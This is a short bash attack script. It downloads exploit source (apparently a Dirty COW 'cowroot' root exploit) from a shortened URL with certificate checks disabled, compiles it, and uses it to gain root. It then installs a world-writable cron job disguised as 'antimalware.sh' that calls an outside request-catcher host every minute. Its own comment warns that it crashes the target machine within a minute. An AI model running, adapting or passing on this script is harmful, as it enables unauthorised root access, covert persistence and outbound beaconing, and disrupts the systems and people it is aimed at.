#!/bin/bash
# Can be run by any unprivileged user to spawn a root shell.
# Warning: this causes the target machine to crash within 30-60 seconds of running it.
wget https://tinyurl.com/mrx63pst --no-check-certificate -O /tmp/cowroot.c
gcc /tmp/cowroot.c -o /tmp/cowroot -pthread # ignore errors
echo 'curl https://delta.requestcatcher.com -k' > /tmp/antimalware.sh
chmod 777 /tmp/antimalware.sh
echo 'echo "*/1 * * * * /tmp/antimalware.sh" | sudo crontab - && exit' | /tmp/cowroot